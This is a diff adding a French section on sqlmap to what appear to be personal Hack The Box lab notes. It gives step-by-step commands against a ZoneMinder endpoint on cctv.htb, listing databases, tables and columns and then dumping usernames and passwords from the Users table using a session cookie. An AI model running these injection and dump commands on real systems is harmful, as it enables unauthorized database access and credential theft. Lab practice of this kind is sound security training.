@@ -154,3 +154,42 @@ cewl <URL>/page
 wafw00f -v <URL>
 ```
 
+## SQLMAP
+### LISTER LES BASES  : 
+
+```bash
+sqlmap -u 'http://cctv.htb/zm/index.php?view=request&request=event&action=removetag&tid=1' --cookie="ZMSESSID=c9r2p3g3fa158huecptlm3ptsp" --batch --dbs
+```
+
+- `--batch` permet de répondre oui automatiquement
+- `--dbs` permet de lister les bdd présentes sur le serveur 
+- `--cookie`si besoin d’une authentification, recup le cookie et l’indiquer
+
+### Lister les tables de la base `zm`
+
+```bash
+sqlmap -u 'http://cctv.htb/zm/index.php?view=request&request=event&action=removetag&tid=1' --cookie="ZMSESSID=c9r2p3g3fa158huecptlm3ptsp" --batch -D zm --tables
+```
+
+- **`-D zm`** : On précise qu'on veut travailler uniquement sur la base `zm`.
+- **`--tables`** : On demande la liste des tables (cherche quelque chose comme `Users`, `Accounts` ou `Users_Accounts`).
+
+### Lister les colonnes d'une table intéressante
+
+S'il y a une table nommée **`Users`** :
+
+```bash
+sqlmap -u 'http://cctv.htb/zm/index.php?view=request&request=event&action=removetag&tid=1' --cookie="ZMSESSID=c9r2p3g3fa158huecptlm3ptsp" --batch -D zm -T Users --columns
+```
+
+- **`-T Users`** : On cible la table des utilisateurs.
+- **`--columns`** : On veut voir les noms des colonnes (ex: `Username`, `Password`).
+
+
+#### Extraire les mots de passe
+
+S'il y a les colonnes `Username` et `Password`, c'est le moment du **DUMP** final :
+
+```bash
+sqlmap -u 'http://cctv.htb/zm/index.php?view=request&request=event&action=removetag&tid=1' --cookie="ZMSESSID=c9r2p3g3fa158huecptlm3ptsp" --batch -D zm -T Users -C "Username,Password" --dump
+```
